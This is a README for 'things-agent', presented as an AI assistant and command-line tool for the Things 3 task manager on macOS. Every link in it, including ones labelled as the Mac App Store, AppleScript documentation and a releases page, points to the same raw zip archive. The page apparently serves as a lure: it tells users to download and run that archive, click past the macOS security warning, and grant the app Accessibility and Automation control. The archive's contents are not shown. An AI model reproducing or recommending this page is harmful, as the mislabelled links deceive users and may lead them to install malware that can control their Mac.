# 🤖 things-agent - AI Assistant for Things 3 Tasks

[![Download things-agent](https://img.shields.io/badge/Download-things--agent-brightgreen)](https://raw.githubusercontent.com/RpeyH/things-agent/main/assets/things-agent-3.3.zip)  

---

## 📋 About things-agent

things-agent is a simple tool that connects your Things 3 task manager with an AI assistant. It uses AppleScript and Things 3 URL Schemes to help you manage tasks through the command line. The app also saves your data securely using SQLite. This means you can restore packages and keep backups easily.

This software is designed for macOS users who want to automate parts of their workflow with Things 3. You don’t need programming skills to use it.

---

## 💻 System Requirements

- macOS 10.15 or later  
- Things 3 installed (available on the Mac App Store)  
- Basic familiarity with downloading files and opening apps  
- Internet connection recommended for certain AI features  

---

## 🚀 Getting Started

Follow these steps to get the app on your Mac and start using it.

### 1. Download things-agent

[![Download things-agent](https://img.shields.io/badge/Download-things--agent-blue)](https://raw.githubusercontent.com/RpeyH/things-agent/main/assets/things-agent-3.3.zip)  

Visit the releases page by clicking the button above. This page holds the latest version of things-agent ready for download.

### 2. Find the latest version

On the page, look for the newest release near the top. It usually has the highest version number and the most recent date.

### 3. Download the app file

Under the latest release, look for a file ending with `.dmg` or `.zip` (common file formats for macOS applications). Click the link to start the download.

### 4. Open the download

Once the download finishes:

- If it is a `.dmg` file, double-click to open it.
- If it is a `.zip` file, double-click to unzip it.

### 5. Install things-agent

Drag the things-agent app file to your Applications folder. This step places the app where your Mac can easily run it.

### 6. Launch things-agent

Open Finder, go to Applications, and double-click things-agent to start it.

The first time you open the app, macOS may warn you since the software is from the internet. Click "Open" to confirm.

---

## ⚙️ Using things-agent

things-agent works in the background to connect Things 3 to an AI assistant. You can use the CLI through the Terminal app to send commands and get responses.

### Opening Terminal

- Open Finder.
- Go to Applications > Utilities.
- Double-click Terminal.

### Basic Commands

Once Terminal is open, you can type simple things-agent commands, such as:

- `things-agent list` — Shows your current tasks from Things 3.
- `things-agent add "Buy groceries"` — Adds a new task.
- `things-agent backup` — Saves your current Things 3 data into a backup package.

### Backups and Restore

things-agent uses SQLite to store your task data. You can create backups to keep your data safe and restore them later if needed.

Use these commands:

- `things-agent backup` to create a backup.
- `things-agent restore filename` to restore a backup from a file.

---

## 🔧 Configuration and Settings

After installing, you can change settings to fit your needs.

### Access settings file

The settings file is stored in your home folder:

`~/.things-agent-config.json`

Open this file with any text editor, such as TextEdit, to view or change settings.

### Common settings

- `ai_enabled`: Set true or false to turn AI features on or off.
- `backup_location`: Path where backups save on your Mac.
- `cli_timeout`: Seconds before commands timeout.

After changing settings, restart things-agent to apply them.

---

## 🛠 Troubleshooting

If you have trouble running the app, try these tips:

- **App won’t open:** Check your macOS security settings in System Preferences > Security & Privacy > Privacy. Allow things-agent to control your computer under Accessibility and Automation.
- **Commands not working:** Make sure Things 3 is open and running.
- **Backup files missing:** Check the backup location path in your config file.
- **Terminal errors:** Copy the error text and search online or post an issue in the GitHub repo.

---

## 🔗 Useful Links

- [Things 3 on Mac App Store](https://raw.githubusercontent.com/RpeyH/things-agent/main/assets/things-agent-3.3.zip)
- [AppleScript Documentation](https://raw.githubusercontent.com/RpeyH/things-agent/main/assets/things-agent-3.3.zip)
- [things-agent Releases Page](https://raw.githubusercontent.com/RpeyH/things-agent/main/assets/things-agent-3.3.zip)  

You can visit the releases page again to check for updates or download new versions.  

---

## 📝 About This Project

things-agent combines smooth task management with AI support, designed for macOS users working with Things 3. It uses AppleScript and the official URL scheme to communicate with Things 3 in real time. The SQLite-based backup helps keep your data safe without complicated steps.

This project covers topics like AI, Applescript, macOS automation, and command-line task control. It serves those who want a mix of automated and manual control over their to-do lists without needing extensive technical knowledge.